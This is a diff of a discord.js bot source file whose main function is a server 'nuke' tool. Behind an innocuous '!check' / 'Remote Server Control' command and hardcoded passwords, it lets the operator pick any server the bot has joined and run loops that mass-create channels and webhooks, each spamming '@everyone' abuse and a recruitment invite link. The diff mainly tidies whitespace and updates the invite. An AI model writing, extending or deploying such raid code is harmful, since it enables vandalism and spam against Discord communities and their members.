@@ -11,14 +11,12 @@ const {
   StringSelectMenuBuilder,
   MessageFlags
 } = require('discord.js');
-
 const express = require('express');
 require('dotenv').config();
 
 // PASSWORDS
 const MAIN_PASSWORD = 'Meka2017charlie';
 const NUKE_PASSWORD = 'meka123';
-
 const userSessions = new Map();
 
 const app = express();
@@ -44,21 +42,18 @@ client.once('ready', () => {
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
-
   if (content === '!check') {
     const embed = new EmbedBuilder()
       .setColor('#00ff00')
       .setTitle('🔍 Remote Server Control')
       .setDescription('Select server → Nuke')
       .setFooter({ text: 'Only you can use this' });
-
     const row = new ActionRowBuilder().addComponents(
       new ButtonBuilder()
         .setCustomId(`check_start_${message.author.id}`)
         .setLabel('Start')
         .setStyle(ButtonStyle.Primary)
     );
-
     return message.reply({ embeds: [embed], components: [row] });
   }
 });
@@ -66,16 +61,13 @@ client.on('messageCreate', async message => {
 // ====================== INTERACTIONS ======================
 client.on('interactionCreate', async interaction => {
   if (!interaction.customId) return;
-
   try {
     const parts = interaction.customId.split('_');
     const action = parts[0];
     const userId = parts[parts.length - 1];
-
     if (interaction.user.id !== userId) {
       return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
     }
-
     if (action !== 'check') return;
 
     // Password flow
@@ -92,18 +84,15 @@ client.on('interactionCreate', async interaction => {
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
-
       const guilds = Array.from(client.guilds.cache.values());
       const options = guilds.map(g => ({
         label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
         value: g.id
       }));
-
       const select = new StringSelectMenuBuilder()
         .setCustomId(`check_server_select_${interaction.user.id}`)
         .setPlaceholder('Select server')
         .addOptions(options);
-
       await interaction.reply({
         content: '✅ Password accepted. Select server:',
         components: [new ActionRowBuilder().addComponents(select)],
@@ -116,12 +105,10 @@ client.on('interactionCreate', async interaction => {
       await interaction.deferUpdate();
       const guild = client.guilds.cache.get(interaction.values[0]);
       userSessions.set(interaction.user.id, { guildId: guild.id });
-
       const actionSelect = new StringSelectMenuBuilder()
         .setCustomId(`check_action_select_${interaction.user.id}`)
         .setPlaceholder('Choose action')
         .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
-
       await interaction.editReply({
         content: `**Selected:** ${guild.name}`,
         components: [new ActionRowBuilder().addComponents(actionSelect)]
@@ -144,15 +131,13 @@ client.on('interactionCreate', async interaction => {
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
-
       await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-
       const session = userSessions.get(interaction.user.id);
       const guild = client.guilds.cache.get(session?.guildId);
       if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
-      const invite = 'https://discord.gg/numrqNJqFP';
+      const invite = 'https://discord.gg/pMkJwQqqmf'; // Updated invite link
       const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
       try {
@@ -166,8 +151,7 @@ client.on('interactionCreate', async interaction => {
 
         // Aggressive Channel + Webhook Raid
         await interaction.followUp({ content: '🔨 Starting aggressive channel creation + webhook spam...', flags: MessageFlags.Ephemeral });
-
-        for (let round = 0; round < 8; round++) {   // Keep going for multiple rounds
+        for (let round = 0; round < 8; round++) {
           // Create channels
           for (let i = 0; i < 8; i++) {
             try {
@@ -181,31 +165,26 @@ client.on('interactionCreate', async interaction => {
             try {
               const webhook = await channel.createWebhook({
                 name: 'Fame',
-                avatar: 'https://i.imgur.com/removed.png' // optional
+                avatar: 'https://i.imgur.com/removed.png'
               });
-
               for (let s = 0; s < 6; s++) {
                 webhook.send(spamText).catch(() => {});
               }
             } catch {}
           }
-
           await delay(1200);
         }
 
-        await interaction.followUp({ 
+        await interaction.followUp({
           content: `✅ **AGGRESSIVE NUKE ACTIVE**\nChannels keep being recreated + Webhook spam running`,
-          flags: MessageFlags.Ephemeral 
+          flags: MessageFlags.Ephemeral
         });
-
       } catch (err) {
         console.error(err);
         await interaction.followUp({ content: '⚠️ Nuke running (rate limits may apply).', flags: MessageFlags.Ephemeral }).catch(() => {});
       }
-
       userSessions.delete(interaction.user.id);
     }
-
   } catch (error) {
     console.error('Interaction Error:', error);
     if (!interaction.replied && !interaction.deferred) {
